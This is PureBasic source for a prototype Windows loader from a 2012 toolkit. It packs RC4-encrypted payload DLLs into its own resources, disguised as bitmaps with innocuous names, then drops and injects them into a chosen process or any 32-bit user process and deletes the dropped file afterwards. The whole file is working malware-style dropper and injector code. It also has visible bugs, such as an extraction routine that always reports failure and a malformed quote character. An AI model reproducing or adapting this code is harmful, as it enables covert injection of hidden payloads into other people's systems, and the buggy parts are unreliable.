; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit


XIncludeFile("core/utils.pbi")
XIncludeFile("filesystem/pefile.pbi")
XIncludeFile("processes/processes.pbi")
XIncludeFile("security/rc4_crypto.pbi")

; ---------------------------------------------------------------------------
;- Consts
#RES_STR_DATA_NAME    = "SIZE"
#RES_STR_64BIT_LOADER = "SIZE64"
#RES_STR_DATA32       = "SAMPLE32"
#RES_STR_DATA64       = "SAMPLE64"
#RES_STR_INJECT_INTO  = "RANDOM00"
#RES_STR_STARTUP      = "RANDOM01"


; ---------------------------------------------------------------------------
;- Types


; ---------------------------------------------------------------------------
;- Prototypes


; ---------------------------------------------------------------------------
;- Variables
Define outputStr.s

; ---------------------------------------------------------------------------
;- Procedures

; ---------------------------------------------------------------------------

CompilerSelect #PB_Compiler_Processor
  CompilerCase #PB_Processor_x86
    ; ***************************************************************************
    ; * ConfigProg -- Creates a copy of the current loader with new settings.   *
    ; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
    ; ***************************************************************************
    Procedure.b ConfigProg(dllFileName32.s, dllFileName64.s, injectInto.s, startupParams.s)
      Define checkSum.s = GenerateChecksum(dllFileName32)
      Define outFileName.s = ""
      Define outExt.s = ""
      Define res.b = #False
      Define rc4.rc4_data
      Define loader64.s = ""
      
      ; create new filename.
      outFileName = GetFilePart(ProgramFilename())
      outExt = GetExtensionPart(outFileName)
      outFileName = Left(outFileName, Len(outFileName) - Len(outExt) - 1) + "_" + checkSum + "." + outExt
      
      ; copy loader
      If Not CopyFile(ProgramFilename(), outFileName)
        Goto ConfigProgError
      EndIf
      
      ; init ARCFOUR encryption
      If Not rc4_init(@rc4, @checkSum, StringByteLength(checkSum))
        Goto ConfigProgError
      EndIf
      
      ; add filename (and ARCFOUR key)
      If Not ResourceAddString(outFileName, #RES_STR_DATA_NAME, checkSum)
        Goto ConfigProgError
      EndIf
      
      ; add the EXE name of the process
      If injectInto <> ""
        If Not ResourceAddString(outFileName, #RES_STR_INJECT_INTO, injectInto)
          Goto ConfigProgError
        EndIf
      EndIf
      
      ; add startup parameters if necessary
      If startupParams <> ""
        If Not ResourceAddString(outFileName, #RES_STR_STARTUP, startupParams)
          Goto ConfigProgError
        EndIf
      EndIf
      
      ; add the 32bit payload
      If dllFileName32 <> "" 
        If Not AddPayload(outFileName, dllFileName32, #RES_STR_DATA32, @rc4)
          Goto ConfigProgError
        EndIf
      EndIf
      
      ; add the 64bit payload
      If dllFileName64 <> ""
        ; add 64bit loader
        loader64 = Left(ProgramFilename(), Len(ProgramFilename()) - 4) + "-64.exe"
        MessageRequester("DEBUG", loader64)
        If Not AddPayload(outFileName, loader64, #RES_STR_64BIT_LOADER, @rc4)
          Goto ConfigProgError
        EndIf
        
        If Not AddPayload(outFileName, dllFileName64, #RES_STR_DATA64, @rc4)
          Goto ConfigProgError
        EndIf
      EndIf
      
      res = #True
      
    ConfigProgCleanup:
      ProcedureReturn res
      
    ConfigProgError:
      res = #False
      If FileSize(outFileName) > 0 
        DeleteFile(outFileName)
      EndIf
      Goto ConfigProgCleanup
    EndProcedure
    
    ; ***************************************************************************
    ; * ExtractData -- Extracts and decrypts the attached data.                 *
    ; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
    ; ***************************************************************************
    Procedure.b ExtractData(dataName.s, outputFileName.s, *rc4.rc4_data)
      Define hDiskDll.i = 0
      Define *buffer = #Null
      Define bufferSize.i = 0
      Define bytesWritten.i = 0
      
      bufferSize = ResourceSize(dataName, #RT_BITMAP)
      If Not (bufferSize > 0)
        Goto ExtractDataCleanup
      EndIf
      
      *buffer = AllocateMemory(bufferSize)
      If Not *buffer
        Goto ExtractDataCleanup
      EndIf
      
      If Not ResourceLoadData(*buffer, bufferSize, dataName, #RT_BITMAP)
        Goto ExtractDataCleanup
      EndIf
      
      rc4_memory(*rc4, *buffer, bufferSize)
      
      hDiskDll = CreateFile(#PB_Any, outputFileName)
      If Not hDiskDll
        Goto ExtractDataCleanup
      EndIf
      
      If WriteData(hDiskDll, *buffer, bufferSize) <> bufferSize
        Goto ExtractDataCleanup
      EndIf
      CloseFile(hDiskDll)
      hDiskDll = 0
    
    ExtractDataCleanup:
      If *buffer
        FreeMemory(*buffer)
      EndIf
      
      If hDiskDll
        CloseFile(hDiskDll)
      EndIf
    
      ProcedureReturn #False
    EndProcedure
    
    ; ***************************************************************************
    ; * GoInject64 --                                                           *
    ; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
    ; ***************************************************************************
    Procedure.b GoInject64(*rc4.rc4_data, localFileName.s, pidForInjection.i)
      Define res.b = #False
      Define loader64.s = GetHomeDirectory() + "/" + #RES_STR_64BIT_LOADER + ".exe"
      Define prog.i = #Null
      Define params.s
      ; If RunProgram(#PB_Compiler_Home+"/Compilers/pbcompiler", "/?", "", #PB_Program_Open|#PB_Program_Wait)
      If Not ExtractData(#RES_STR_64BIT_LOADER, loader64, *rc4)
        Goto GoInject64Cleanup
      EndIf
      
      params = Chr($22) + loader64 + Chr(22) + " " + Chr(22) + Str(pidForInjection) + Chr(22)
      prog = RunProgram(loader64, params, GetHomeDirectory(), #PB_Program_Open|#PB_Program_Wait)
      WaitProgram(prog)
      If ProgramExitCode(prog) = 0
        res = #True
      EndIf
      
    GoInject64Cleanup:
      DeleteFile(localFileName)
      ProcedureReturn res
    EndProcedure
    
    ; ***************************************************************************
    ; * GoInject --                                                             *
    ; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
    ; ***************************************************************************
    Procedure GoInject()
      Define pidForInjection.i = 0
      Define checkSum.s = ResourceLoadString(#RES_STR_DATA_NAME)
      Define exeName.s = ResourceLoadString(#RES_STR_INJECT_INTO)
      Define rc4.rc4_data
      Define res.b = #False
      
      Define startupParams.s = ResourceLoadString(#RES_STR_STARTUP)
      Define localFileName.s = GetHomeDirectory() + "/" + checkSum + ".dll"
      
      If exeName = ""
        exeName = GetAny32bitUserProcessName()
      EndIf
      pidForInjection = GetPidByName(exeName)
      
      If pidForInjection = 0
        Goto GoInjectCleanup
      EndIf
      
      exeName = #RES_STR_DATA64
      If IsProcess32bit(pidForInjection, @res)
        If res
          exeName = #RES_STR_DATA32
        EndIf
      EndIf
      
      If Not rc4_init(@rc4, @checkSum, StringByteLength(checkSum))
        Goto GoInjectCleanup
      EndIf
      
      If Not ExtractData(exeName, localFileName, @rc4)
        Goto GoInjectCleanup
      EndIf
      
      If startupParams <> ""
        If Not ResourceAddString(localFileName, #RES_STR_STARTUP, startupParams)
          Goto GoInjectCleanup
        EndIf
      EndIf
      
      If exeName = #RES_STR_DATA32
        ; 32bit process
        If InjectDll(localFileName, pidForInjection)
          WaitForProcess(pidForInjection)
        EndIf
      Else
        ; 64bit process
        If GoInject64(@rc4, localFileName, pidForInjection)
          WaitForProcess(pidForInjection)
        EndIf
      EndIf
      
    GoInjectCleanup:
      DeleteFile(localFileName)
    EndProcedure
    
    Select ProgramParameter(0)
      Case "config"
        End (Not ConfigProg(ProgramParameter(1), ProgramParameter(2), ProgramParameter(3), ProgramParameter(4)))
        
      Case "print"
        If OpenConsole()
          ; 32bit payload
          If ResourceSize(#RES_STR_DATA32, #RT_BITMAP) > 0
            outputStr = "OK"
          Else
            outputStr = "MISSING!"
          EndIf
          outputStr = #RES_STR_DATA32 + ": " + outputStr + #CRLF$
          
          ; 64bit payload
          outputStr = outputStr + #RES_STR_DATA64 + ": "
          If ResourceSize(#RES_STR_DATA64, #RT_BITMAP) > 0
            outputStr = outputStr + "OK"
          Else
            outputStr = outputStr + "MISSING!"
          EndIf
          
          ; target process
          outputStr = outputStr + #CRLF$ + #RES_STR_INJECT_INTO + ": " + ResourceLoadString(#RES_STR_INJECT_INTO) + #CRLF$
          
          ; startup parameter
          outputStr = outputStr + #RES_STR_STARTUP + ": " + ResourceLoadString(#RES_STR_STARTUP)
          
          PrintN(outputStr + #CRLF$ + #CRLF$ + "Press [Enter] To exit.")
          Input()
          End
        EndIf
        
      Default
        GoInject()
    EndSelect
    
  CompilerCase #PB_Processor_x64
    If Not InjectDll(ProgramParameter(1), Val(ProgramParameter(2)))
      End 1
    Else
      End 0
    EndIf
    
  CompilerDefault
    CompilerError "Platform not supported!"
CompilerEndSelect

; IDE Options = PureBasic 4.60 Beta 3 (Windows - x64)
; CursorPosition = 46
; FirstLine = 41
; Folding = w
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant